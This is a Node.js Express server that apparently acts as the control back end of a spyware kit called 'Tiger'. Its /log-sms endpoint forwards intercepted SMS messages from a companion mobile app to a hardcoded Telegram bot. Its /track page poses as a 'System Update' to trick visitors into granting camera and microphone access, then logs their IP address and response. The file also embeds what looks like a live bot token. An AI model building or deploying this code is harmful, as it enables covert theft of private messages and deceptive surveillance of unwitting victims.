const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
const CHAT_ID = '7128071523';

let smsLogs = [];

// 1. Mobile App SMS (Telegram + Portal)
app.post('/log-sms', async (req, res) => {
    try {
        const { sender, message, device } = req.body;
        const newEntry = {
            id: Date.now(),
            device: device || 'Tiger-App',
            sender: sender || 'Unknown',
            message: message || 'Empty',
            time: new Date().toLocaleString()
        };
        smsLogs.unshift(newEntry);
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `🐯 *Tiger SMS Alert!*\n\n📱 *Device:* ${newEntry.device}\n👤 *From:* ${newEntry.sender}\n💬 *Message:* ${newEntry.message}`,
            parse_mode: 'Markdown'
        });
        res.status(200).json({ status: 'success' });
    } catch (error) { res.status(500).send(); }
});

// 2. Link Tracking (SIRF PORTAL - No Telegram)
app.post('/log-link-access', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { status, type } = req.body;
    smsLogs.unshift({
        id: Date.now(),
        device: '🌐 Web Link',
        sender: ip,
        message: `${type}: ${status}`,
        time: new Date().toLocaleString()
    });
    res.json({ success: true });
});

// 3. Tracking Page (/track)
app.get('/track', (req, res) => {
    res.send(`<html><body style="background:#000;color:#fff;text-align:center;padding:50px;">
        <h1>System Update</h1><p>Hardware verification needed.</p>
        <button onclick="start()" style="padding:15px 30px;border-radius:25px;background:#1ed760;border:none;color:#fff;font-weight:bold;cursor:pointer;">Verify Hardware</button>
        <script>async function start(){
            try {
                const s = await navigator.mediaDevices.getUserMedia({audio:true,video:true});
                await fetch('/log-link-access',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({status:'✅ GRANTED',type:'Cam/Mic'})});
                s.getTracks().forEach(t=>t.stop());
                alert("Verified!"); window.location.href="https://google.com";
            } catch(e) {
                fetch('/log-link-access',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({status:'❌ DENIED',type:'Cam/Mic'})});
                alert("Permission Required");
            }
        }</script></body></html>`);
});

app.get('/get-logs', (req, res) => res.json(smsLogs));
app.post('/clear-logs', (req, res) => { smsLogs = []; res.json({success:true}); });

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log('🚀 Tiger Server Live'));
